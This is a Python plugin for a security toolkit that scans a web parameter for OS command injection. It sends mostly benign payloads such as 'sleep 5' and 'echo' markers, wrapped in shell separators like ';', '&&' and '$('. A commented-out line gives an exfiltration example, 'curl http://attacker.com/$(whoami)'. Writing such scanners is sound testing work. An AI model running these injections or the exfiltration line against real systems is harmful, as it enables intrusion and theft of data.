from typing import Any, Dict
from cyber_tools import CyberToolPlugin, RiskLevel
import requests
import urllib.parse


class CommandInjectionScannerTool(CyberToolPlugin):
    """Command injection vulnerability scanner - READ_ONLY probe."""
    name = "cmd_injection_scanner"
    description = "Test for OS command injection via parameter payloads (read-only, non-destructive)"
    version = "1.0.0"
    environments = ["cross_platform"]
    requires_admin = False
    risk_level = RiskLevel.READ_ONLY

    # Payloads that are safe but detectable
    PAYLOADS = [
        # Time-based detection
        ("sleep 5", "time", 5),
        ("ping -c 3 127.0.0.1", "time", 3),
        # Output-based detection (if reflected)
        ("echo CMDI_TEST_123", "output", "CMDI_TEST_123"),
        ("printf CMDI_TEST_456", "output", "CMDI_TEST_456"),
        # DNS exfiltration (requires external DNS logging)
        # ("curl http://attacker.com/$(whoami)", "dns", "attacker.com"),
    ]

    # Injection contexts
    CONTEXTS = [
        "",  # Direct
        "; ",  # Semicolon
        " && ",  # AND
        " || ",  # OR
        "| ",  # Pipe
        "`",  # Backtick
        "$(",  # Subshell
        "\n",  # Newline
        "\n; ",  # Newline + semicolon
    ]

    def run(self, arguments: Dict[str, Any]) -> Dict[str, Any]:
        url = arguments.get("url", "")
        method = arguments.get("method", "GET").upper()
        param = arguments.get("param", "cmd")
        headers = arguments.get("headers", {})
        timeout = arguments.get("timeout", 15)
        payloads = arguments.get("payloads", None)  # Custom payloads
        contexts = arguments.get("contexts", None)  # Custom contexts

        if not url:
            return {"success": False, "output": {}, "error": "Missing 'url' argument."}

        test_payloads = payloads or [p[0] for p in self.PAYLOADS]
        test_contexts = contexts or self.CONTEXTS

        findings = []

        try:
            # First, get baseline response
            baseline = self._send_request(url, method, param, "", headers, timeout)
            baseline_len = len(baseline.get("body", ""))
            baseline_time = baseline.get("response_time", 0)

            for payload in test_payloads:
                for context in test_contexts:
                    injected = f"{context}{payload}"
                    encoded = urllib.parse.quote(injected) if method == "GET" else injected
                    
                    result = self._send_request(url, method, param, encoded, headers, timeout)
                    
                    # Time-based detection
                    if result.get("response_time", 0) > baseline_time + 4:  # 4+ seconds delay
                        findings.append({
                            "type": "time_based",
                            "payload": injected,
                            "context": context,
                            "baseline_time": baseline_time,
                            "injected_time": result.get("response_time"),
                            "delay": result.get("response_time") - baseline_time,
                            "url": url,
                            "param": param
                        })
                        continue

                    # Output-based detection
                    body = result.get("body", "")
                    if "CMDI_TEST_" in body:
                        findings.append({
                            "type": "output_based",
                            "payload": injected,
                            "context": context,
                            "evidence": "Command output reflected in response",
                            "url": url,
                            "param": param
                        })
                        continue

                    # Error-based detection
                    error_indicators = ["syntax error", "command not found", "sh:", "bash:", "cmd.exe", "/bin/sh", "permission denied", "not recognized"]
                    for indicator in error_indicators:
                        if indicator.lower() in body.lower() and indicator.lower() not in baseline.get("body", "").lower():
                            findings.append({
                                "type": "error_based",
                                "payload": injected,
                                "context": context,
                                "evidence": f"Error indicator: {indicator}",
                                "url": url,
                                "param": param
                            })
                            break

            return {
                "success": True,
                "output": {
                    "url": url,
                    "method": method,
                    "param": param,
                    "tests_run": len(test_payloads) * len(test_contexts),
                    "vulnerable": len(findings) > 0,
                    "findings": findings,
                    "baseline": {"length": baseline_len, "time": baseline_time}
                },
                "error": ""
            }
        except Exception as exc:
            return {"success": False, "output": {}, "error": str(exc)}

    def _send_request(self, url: str, method: str, param: str, value: str, headers: Dict, timeout: int) -> Dict:
        import time
        start = time.time()
        try:
            if method == "GET":
                resp = requests.get(url, params={param: value}, headers=headers, timeout=timeout)
            else:
                resp = requests.post(url, data={param: value}, headers=headers, timeout=timeout)
            return {
                "status_code": resp.status_code,
                "response_time": time.time() - start,
                "body": resp.text
            }
        except requests.Timeout:
            return {"status_code": 0, "response_time": timeout, "body": "", "error": "timeout"}
        except Exception as e:
            return {"status_code": 0, "response_time": time.time() - start, "body": "", "error": str(e)}


TOOL_CLASS = CommandInjectionScannerTool